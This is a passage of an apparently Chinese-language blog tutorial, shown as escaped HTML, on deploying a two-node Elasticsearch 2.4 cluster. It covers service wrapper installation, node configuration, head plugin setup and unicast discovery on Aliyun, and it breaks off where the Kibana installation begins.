&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@ELK ~]&lt;span class=&quot;comment&quot;&gt;# git clone https://github.com/elastic/elasticsearch-servicewrapper.git&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Initialized empty Git repository &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; /root/elasticsearch-servicewrapper/.git/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;remote: Counting objects: 184, done.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;remote: Total 184 (delta 0), reused 0 (delta 0), pack-reused 184&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Receiving objects: 100% (184/184), 4.55 MiB | 511 KiB/s, done.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Resolving deltas: 100% (53/53), done.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@ELK elasticsearch-servicewrapper]&lt;span class=&quot;comment&quot;&gt;# mv service/ /usr/local/elasticsearch/bin/&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@ELK elasticsearch-servicewrapper]&lt;span class=&quot;comment&quot;&gt;# cd /usr/local/elasticsearch&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@ELK elasticsearch]&lt;span class=&quot;comment&quot;&gt;# /usr/local/elasticsearch/bin/service/elasticsearch install    这里是安装es&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Detected RHEL or Fedora:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Installing the Elasticsearch daemon..&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@ELK elasticsearch]&lt;span class=&quot;comment&quot;&gt;# vim /etc/init.d/elasticsearch   查看安装es启动配置文件&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@ELK elasticsearch]&lt;span class=&quot;comment&quot;&gt;# service elastic search start  启动es &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Starting Elasticsearch...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Waiting &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; Elasticsearch......&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;running: PID:31360   服务已启动了。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;启动相关服务&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;service elasticsearch start&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;service elasticsearch status&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;配置 elasticsearch 服务随系统自动启动&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# chkconfig --add elasticsearch&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;测试ElasticSearch服务是否正常，预期返回200的状态码&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# curl -X GET http://localhost:9200&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;es-02服务端节点：&quot;&gt;&lt;a href=&quot;#es-02服务端节点：&quot; class=&quot;headerlink&quot; title=&quot;es_02服务端节点：&quot;&gt;&lt;/a&gt;es_02服务端节点：&lt;/h3&gt;&lt;p&gt;第一步基础配置都是一样的，跟es_01节点一样。  其他只需要到es_01拷贝过来,然后创建下es用户，修改下配置。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/elasticsearch  目录拷贝到es_02机器。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;这里需要修改配置文件：&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;配置前先创建几个目录文件&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 srv]]&lt;span class=&quot;comment&quot;&gt;# mkdir /srv/data/es-data -p&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 srv]&lt;span class=&quot;comment&quot;&gt;# mkdir /srv/data/es-work &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;修改源码目录属性属组：&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 elasticsearch]&lt;span class=&quot;comment&quot;&gt;# useradd  -s /sbin/nologin elasticsearch&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 elasticsearch]&lt;span class=&quot;comment&quot;&gt;# chown -R elasticsearch:elasticsearch /usr/local/elasticsearch/*&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 elasticsearch]&lt;span class=&quot;comment&quot;&gt;# chown -R elasticsearch:elasticsearch /srv/data/&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;修改配置文件&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;vim elasticsearch.yml&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;node.name: es_02&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;network.host: 10.47.88.188&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;其他不需要修改&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;集群节点es-02测试：&quot;&gt;&lt;a href=&quot;#集群节点es-02测试：&quot; class=&quot;headerlink&quot; title=&quot;集群节点es_02测试：&quot;&gt;&lt;/a&gt;集群节点es_02测试：&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@es_02 home]&lt;span class=&quot;comment&quot;&gt;# curl http://10.47.88.188:9200&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;es_02&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;cluster_name&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;elk_cluster&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;cluster_uuid&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;-4Rqn4IzS1GfnsodqZD8Tg&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;version&quot;&lt;/span&gt; : &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;number&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;2.4.3&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;build_hash&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;d38a34e7b75af4e17ead16f156feffa432b22be3&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;build_timestamp&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;2016-12-07T16:28:56Z&quot;&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;build_snapshot&quot;&lt;/span&gt; : &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&quot;lucene_version&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;5.5.2&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;string&quot;&gt;&quot;tagline&quot;&lt;/span&gt; : &lt;span class=&quot;string&quot;&gt;&quot;You Know, for Search&quot;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;elk集群已安装配置完毕，我这里配置了nginx做下反向代理，走80端口出去。然后在nginx设置下内部公司访问不对外开放。&lt;/p&gt;
&lt;h3 id=&quot;安装-head、marvel、bigdesk插件&quot;&gt;&lt;a href=&quot;#安装-head、marvel、bigdesk插件&quot; class=&quot;headerlink&quot; title=&quot;安装 head、marvel、bigdesk插件:&quot;&gt;&lt;/a&gt;安装 head、marvel、bigdesk插件:&lt;/h3&gt;&lt;p&gt;es1.5插件安装是&lt;code&gt;./plugin -install xxx&lt;/code&gt;,而es2.4插件安装没有减号&lt;code&gt;./plugin install xxx&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;1.5版本方法：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;* head插件&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;插件安装方法1：&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/elasticsearch/bin/plugin -install mobz/elasticsearch-head&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;重启es 即可。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;打开http://localhost:9200/_plugin/head/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;插件安装方法2：&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;1.https://github.com/mobz/elasticsearch-head下载zip 解压&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2.建立elasticsearch-1.0.0\plugins\head\_site文件&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3.将解压后的elasticsearch-head-master文件夹下的文件copy到_site&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;重启es 即可。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;打开http://localhost:9200/_plugin/head/&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;2.4版本以上安装：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;* head插件&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;插件安装方法1：&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;/usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/elasticsearch/bin/plugin install mobz/elasticsearch-head&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;重启es 即可。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;打开http://localhost:9200/_plugin/head/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;插件安装方法2：&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;1.https://github.com/mobz/elasticsearch-head下载zip 解压&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2.建立elasticsearch-1.0.0\plugins\head\_site文件&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3.将解压后的elasticsearch-head-master文件夹下的文件copy到_site&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;重启es 即可。&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;打开http://localhost:9200/_plugin/head/&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;为了保障搜索服务的稳定性，增加了一台机器，将Elasticsearch部署成了集群模式， 部署到生产环境时发现，新的节点并不能被发现，后台发现阿里云并不支持多播，最后只能改为单播的方式配置了，好在之后一切顺利。&lt;/p&gt;
&lt;p&gt;下面附上测试环境配置示例：添加下下面监听集群IP和端口。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;es_01&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 config]&lt;span class=&quot;comment&quot;&gt;# vim elasticsearch.yml&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;discovery.zen.ping.multicast.enabled: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;discovery.zen.ping.unicast.hosts: [&lt;span class=&quot;string&quot;&gt;&quot;10.47.88.206:9300&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;10.47.88.188:9300&quot;&lt;/span&gt;]&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;es_02&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@es_02 config]&lt;span class=&quot;comment&quot;&gt;# vim elasticsearch.yml&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;discovery.zen.ping.multicast.enabled: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;discovery.zen.ping.unicast.hosts: [&lt;span class=&quot;string&quot;&gt;&quot;10.47.88.206:9300&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;10.47.88.188:9300&quot;&lt;/span&gt;]&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后重启服务，查看集群节点。&lt;/p&gt;
&lt;h3 id=&quot;es-02安装Kibana&quot;&gt;&lt;a href=&quot;#es-02安装Kibana&quot; class=&quot;headerlink&quot; title=&quot;es_02安装Kibana:&quot;&gt;&lt;/a&gt;es_02安装Kibana:&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;55&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;56&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;57&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;58&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;59&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;60&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;61&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;62&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;63&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;64&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;65&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;66&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;67&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;68&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;69&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;70&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;71&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;72&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;73&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;74&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;75&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;76&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;77&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;78&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;79&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;80&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;81&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;82&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;83&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;84&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;85&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;86&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;87&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;88&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;89&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;90&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;91&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;92&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;93&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;94&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;95&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;96&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;97&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;98&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;99&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;100&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;101&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;102&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;103&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;104&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;105&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;106&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;107&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;108&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;109&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;110&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;111&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;112&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;113&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;114&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;115&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;116&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;117&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;118&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;到https://www.elastic.co/downloads/kibana  找合适的版本。&lt;/div&gt;&lt;div 